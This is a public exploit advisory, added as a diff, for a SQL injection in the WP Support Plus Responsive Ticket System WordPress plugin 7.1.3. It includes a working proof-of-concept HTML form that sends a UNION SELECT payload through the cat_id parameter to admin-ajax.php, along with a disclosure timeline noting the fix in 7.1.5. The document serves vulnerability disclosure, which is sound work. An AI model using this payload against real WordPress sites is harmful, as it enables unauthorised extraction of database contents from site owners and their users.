@@ -1,0 +1,31 @@
+# Exploit Title: WP Support Plus Responsive Ticket System 7.1.3 – WordPress Plugin – Sql Injection
+# Exploit Author: Lenon Leite
+# Vendor Homepage: https://wordpress.org/plugins/wp-support-plus-responsive-ticket-system/
+
+# Software Link: https://wordpress.org/plugins/wp-support-plus-responsive-ticket-system/
+# Contact: http://twitter.com/lenonleite
+# Website: http://lenonleite.com.br/
+# Category: webapps
+# Version: 7.1.3
+# Tested on: Ubuntu 14.04
+
+1 - Description:
+
+Type user access: any user. $_POST[‘cat_id’] is not escaped. Is accessible for any user.
+
+http://lenonleite.com.br/en/blog/2016/12/13/wp-support-plus-responsive-ticket-system-wordpress-plugin-sql-injection/
+
+2 - Proof of Concept:
+
+<form action="http://target/wp-admin/admin-ajax.php" method="post">
+<input type="text" name="action" value="wpsp_getCatName">
+<input type="text" name="cat_id" value="0 UNION SELECT 1,CONCAT(name,CHAR(58),slug),3 FROM wp_terms WHERE term_id=1">
+<input type="submit" name="">
+</form>
+
+3 - Timeline:
+
+
+- 12/12/2016 – Discovered
+- 13/12/2016 – Vendor notifed
+- 16/12/2016 – Resolve issue version 7.1.5
